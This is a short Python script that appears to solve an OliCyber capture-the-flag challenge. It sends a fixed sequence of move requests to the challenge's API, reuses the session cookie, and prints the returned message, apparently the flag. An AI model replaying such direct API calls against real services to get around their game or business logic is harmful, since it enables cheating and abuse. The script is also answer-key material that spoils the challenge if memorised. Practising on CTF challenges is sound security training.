import requests, json # leggendo il file di network si vede una cosa strana
site = "http://trais.challs.olicyber.it/"
site1 = site + "api/move/"
c = requests.get(site)
c = requests.get(site1 + "2/2", cookies=c.cookies.get_dict())
c = requests.get(site1 + "2/1", cookies=c.cookies.get_dict())
r = requests.get(site1 + "2/3", cookies=c.cookies.get_dict())
print(json.loads(r.text)["message"], end="")